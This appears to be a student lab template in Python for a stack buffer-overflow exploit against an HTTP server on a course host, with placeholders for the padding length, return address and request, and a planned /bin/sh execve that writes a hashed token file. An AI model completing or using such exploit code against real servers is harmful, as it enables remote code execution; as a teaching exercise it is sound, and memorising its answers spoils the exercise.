import socket
import random

def to_bytes(i, l=8):
    return int.to_bytes(i, length=l, byteorder='little')

# Method should always be get
METHOD = b"GET"

# We don't care what URL we're grabbing; they all have the possibility of exploit...
URL = b"/"

PORT = random.randint(10000, 10025)

# Figure out how many bytes we need to pad until we get to the return address 
# on the stack. (Hint: It's not 10...)
N = 10
PADDING = b"\xff" * N

# Fill this in with the address you actually want instead of `0xdeadbeef`
ADDRESS = to_bytes(0xdeadbeef)

USER = b"FILL ME IN"
PASSWORD = b"FILL ME IN"

# These are the arguments that make up the shell script we want to execve.
# Don't forget that there needs to be a NULL pointer as the last argument in addition to these!
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo -n \"" + USER + b"\" | sha384sum > /hackme/tiny/tokens/" + PASSWORD + b"\x00"]

# The "exploit string" is what we send in as the headers
HEADERS = PADDING + ADDRESS

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("adventure.com.puter.systems", PORT))
request = b"PUT TOGETHER THE PIECES HERE. DON'T FORGET TO USE \r\n's!"
print(request)
client.send(request)
response = client.recv(4096)
print(response.decode())
